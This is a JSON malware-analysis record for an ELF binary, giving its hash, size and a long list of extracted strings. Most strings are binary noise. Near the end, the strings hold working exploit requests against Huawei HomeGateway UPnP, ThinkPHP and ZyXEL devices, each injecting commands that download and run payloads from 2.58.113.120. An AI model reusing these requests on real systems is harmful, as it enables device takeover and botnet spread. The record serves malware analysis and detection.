{
    "malware_data": [
        {
            "filename": "9902df7149b19f56fdf08e56e299835da52093b292066b0eed0dcc4847d10eb4.elf",
            "filetype": "7F454C46",
            "filesize": "77KB",
            "hash_sha256": "9902df7149b19f56fdf08e56e299835da52093b292066b0eed0dcc4847d10eb4",
            "strings": [
                "$@N^NuNV",
                "f>\"y",
                "N^NuNV",
                "N^Nu",
                " OHWHQHy",
                "NuNV",
                "f$/.",
                "R$ Q",
                "N^NuO",
                "?>&o",
                "/f4B",
                " BHh",
                "g \"H",
                "$HB(",
                " @Hh",
                "R\"Hx",
                "?>*o",
                "(@/<",
                "SXHx",
                "F0@A",
                "J<@M",
                "4$p,",
                "m\"9@",
                "H`(a",
                "F@7@",
                "$NuO",
                "?>,/",
                "&@/<",
                "&@!sh",
                ".$p,",
                "d<7@",
                "\"FHq",
                "cb5@",
                "^D9@",
                "?>$/",
                "&HHx",
                "(H/<",
                "<@Hx",
                "}f5@",
                "P&HHx",
                "B(H/<",
                "v(H/<",
                "tN<@`",
                "r65@",
                " &HHx",
                "oj5@",
                "T&HHx",
                "F(H/<",
                "z(H/<",
                "fN<@`",
                "d65@",
                "?>(o",
                "f~Bj",
                "=:7@",
                "<|5@",
                "<NuO",
                ",@Hx",
                "7V7@",
                "f*HB",
                "2>5@",
                "2x7@",
                "- 7@",
                ",b5@",
                "2$p,",
                "cfxBj",
                "'r5@",
                "'(7@",
                "Hp'@",
                "`\":|",
                "LNuO",
                "\"$7@",
                "!f5@",
                "?>,o",
                "L:@K",
                "3|eX",
                "4$q,",
                "X GN",
                "T\"GN",
                "< GN",
                "4NuNV",
                "?<(n",
                " N!<",
                "6d$.",
                "605@",
                "?>./",
                "*@Hx",
                "(HHx",
                "B FN",
                "L\"C$F",
                "H<@M",
                " GHp",
                "Hw(P/",
                "`2/|",
                "2/|@",
                "&/|JR**",
                "DNuO",
                "?>&/",
                "`Hx@",
                " G$p",
                "~P /",
                "+`$/",
                "+(?@",
                "*<5@",
                "X\"G#",
                ")n7@",
                "XNuO",
                "zB$@O",
                "eX?|",
                "yH$@O",
                "vl /",
                "XNu/",
                "BBHB",
                "BAHA",
                "BAHAJ",
                "<NuHx",
                "RXHx",
                "4$LN",
                "BEHE,",
                "UUUV\"",
                "HGBG",
                "R@By",
                "R:Hx",
                "RHBy",
                "RTHx",
                "RDHy",
                "RT?|",
                "DHx@",
                "R0/9",
                "gL IC",
                "S\\\"*",
                "gD 9",
                " DHh",
                " 7- ",
                "F,B3",
                "H@B@",
                "fFth C ",
                "h2 /",
                "A@Hx@",
                " NuHx",
                "?<4.",
                "YD$HX",
                "=`Hy",
                "(OHt",
                "=HHj",
                "X\\$HX",
                "{rHx",
                "zlHx",
                "R\\Hx",
                "N<Hx",
                "B GN",
                "S`Hn",
                "QZ\"@O",
                "S`B1",
                "QFHx",
                "&vHx",
                "&lHn",
                "$HHn",
                "\"BAS",
                "\"B@S",
                "7vHx",
                "4N^Nu#",
                "gP=|",
                "R*$HB",
                "gVHx",
                "SX=|",
                "gL=|",
                "HzHx[",
                "`PB9",
                "sX/9",
                "H(Hx[",
                "N^NuHx",
                "SjHx",
                "gLHn",
                "4 GN",
                "  GN",
                "H,Hx",
                " pHn",
                "+jHx",
                "f(Bn",
                "Rd$9",
                "RdHx",
                "Sh/9",
                "V&NBca",
                "gT/9",
                "SXHx@",
                "(^/9",
                "8Hx@",
                "N^Nu/",
                "Rj\"9",
                "Rn\"9",
                "88$/",
                "gb$o",
                "Rj 9",
                " NuH",
                "8 $o",
                "Rr(9",
                "Rn\"y",
                "Rj$9",
                "Rf`0 ",
                "NuHx",
                " AHh",
                "W0$H#",
                "Rv$y",
                "Rv y",
                "4$MN",
                "Rz,<",
                "+kHy",
                "(cHy",
                "(hHy",
                "(qHy",
                "(xHy",
                " G1@",
                "BBHB(",
                " G!B",
                "fffg",
                "n F1|",
                " F!y",
                " F1@",
                "Rz/9",
                "I~ .",
                "gH IC",
                "S\\&*",
                "(C$.",
                " KHh",
                "S\\$,",
                " 6- ",
                " C/(",
                " F1|",
                "fl n",
                "g\\Hx@",
                "f, .",
                "~ THx@",
                "+i/,",
                " THx@",
                "JHx@",
                "vHx@",
                "h D ",
                "g2/,",
                "L&B$.",
                "N^Nu\"/",
                "BCHC$",
                "<NuH",
                " 0Hx",
                "T<Hx",
                "T*Hx",
                "g: 9",
                "'` /",
                "nHx@",
                " Nu o",
                "NuNq/",
                "g \"A\"",
                "Nu\"o",
                "NuNq o",
                "NuNqH",
                " 0&o",
                "?0\"o",
                "b60|",
                "eLgF ",
                "b(p7 B",
                "pW B",
                ">0,/",
                "$BHx",
                "|NuNV",
                "gF=|",
                "\"^Hn",
                "N^NuH",
                "< */",
                "<Nu\"o",
                "8  /",
                "gb J",
                "`Jp7",
                "` J ",
                "$NuHx",
                "BDHD*",
                "gJ IC",
                " CHh",
                "fDxh*",
                " NuNuNV",
                " A-P",
                "`V-n",
                "p7N@-@",
                "N@-@",
                "N^NuNuNV",
                "p@N@-@",
                "p6N@-@",
                "p%N@-@",
                "<0&n",
                "0 $n",
                "pUN@-@",
                "<8&n",
                "pBN@-@",
                "`h-n",
                "f(/.",
                " @N^NuNuNV",
                "eL n",
                "`j .",
                " @N^NuNV",
                "SH @N^NuNV",
                "`~ n",
                "`@ n",
                "`b n",
                "`l n",
                "lp -@",
                "`^/.",
                "b\"\"9",
                "S8 .",
                "g4 .",
                "gF/.",
                " @$.",
                "f>Hy",
                "g\"\".",
                "`2/.",
                " @-P",
                "`j/.",
                "f* 9",
                "f\"/.",
                "g& .",
                "bHHy",
                "`J n",
                "e4\".",
                "`\\\".",
                "b0 .",
                "f6 n",
                "e*/.",
                "`t n",
                "g>\".",
                "f& n",
                "`& .",
                "`\"/.",
                "Q0/.",
                "`*\"n",
                "fffg\"",
                "gR n",
                "fffg$",
                "f: n",
                "g*\"n",
                "0f*R",
                "`2 n",
                "~p\" ",
                "S,/.",
                "jNqNV",
                "p -@",
                "(r -A",
                "g. .",
                "HN^NuNuNV",
                "f&/.",
                "f8 9",
                "S8 <",
                "S@ .",
                "S4 n",
                "S4Hx",
                "S4-@",
                "`>-n",
                "e( n",
                "f\" .",
                "gF\".",
                "g./<",
                "S<\"<",
                "NqNuNV",
                "pfN@-@",
                "NqNV",
                "plN@-@",
                "`,-y",
                "p+N@-@",
                "LN^NuNV",
                "DN^NuNV",
                "`R n",
                "`& n",
                "`H n",
                "`> .",
                "`| n",
                "gB n",
                "mB .",
                "f4Hx",
                "f6 9",
                "SPHy",
                "f~ 9",
                "SPHx",
                "p-N@-@",
                "ST .",
                "80&n",
                "N^NuPOST /ctrlt/DeviceUpgrade_1 HTTP/1.1",
                "Content-Length: 430",
                "Connection: keep-alive",
                "Accept: */*",
                "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\"",
                "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox wget -g 2.58.113.120 -l /tmp/binary -r /mips; /bin/busybox chmod 777 * /tmp/binary; /tmp/binary mips)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>",
                "2.58.113.120",
                "&;; ",
                "<!: acam",
                " 18:1 ",
                "0125!8 ",
                "$5''#;&0",
                "\"=.,\"",
                "'!$$;& ",
                "?;d509=:",
                "efg`a",
                "!'1&",
                ",<8#",
                ":217 10t",
                "!8 T",
                "'<188T",
                "1:5681T",
                "'-' 19T",
                "{6=:{6!'-6;,t",
                "nt5$$81 t:; t2;!:0T",
                ":7;&&17 T",
                "{6=:{6!'-6;,t$'T",
                "{6=:{6!'-6;,t?=88tymtT",
                "{$&;7{T",
                "{1,1T",
                "{20T",
                "{95$'T",
                "{$&;7{:1 { 7$T",
                "{' 5 !'T",
                "z5:=91T",
                "{$&;7{:1 {&;! 1T",
                "5''#;&0T",
                "{1 7{&1';8\"z7;:2T",
                ":591'1&\"1&tT",
                "{01\"{#5 7<0;3T",
                "{01\"{9='7{#5 7<0;3T",
                "$662*7!E",
                ";3=:T",
                "1: 1&T",
                "e365`70;9ag:<$ef1=d?2>T",
                ";!&71t",
                ":3=:1t",
                "!1&-T",
                "GET /index.php?s=/index/",
                "hink",
                "pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://2.58.113.120/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1",
                "Accept-Encoding: gzip, deflate",
                "Accept: /",
                "User-Agent: Uirusu/2.0",
                "POST /cgi-bin/ViewLog.asp HTTP/1.1",
                "Host: 192.168.0.14:80",
                "User-Agent: python-requests/2.20.0",
                "Content-Length: 227",
                "Content-Type: application/x-www-form-urlencoded",
                " /bin/busybox wget http://2.58.113.120/zyxel.sh; chmod +x zyxel.sh; ./zyxel.sh",
                "?/dev/null",
                "S[kA",
                ".shstrtab",
                ".init",
                ".text",
                ".fini",
                ".rodata",
                ".ctors",
                ".dtors",
                ".data",
                ".bss"
            ]
        }
    ]
}